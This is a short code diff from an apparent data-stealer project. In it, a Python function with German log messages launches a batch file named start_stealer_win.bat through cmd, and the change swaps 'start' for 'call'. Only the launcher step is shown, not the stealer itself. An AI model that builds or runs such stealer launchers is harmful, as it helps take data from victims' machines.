@@ -236,7 +236,7 @@ def set_birthday(date):
 def option1():
     if start_stealer:
         debug("Stealer-Skript wird ausgeführt")
-        subprocess.run(["cmd", "/c", "start", start_stealer])
+        subprocess.run(["cmd", "/c", "call", start_stealer])
     else:
         debug("Stealer-Skript nicht gefunden.")
         print("start_stealer_win.bat konnte nicht gefunden werden.")
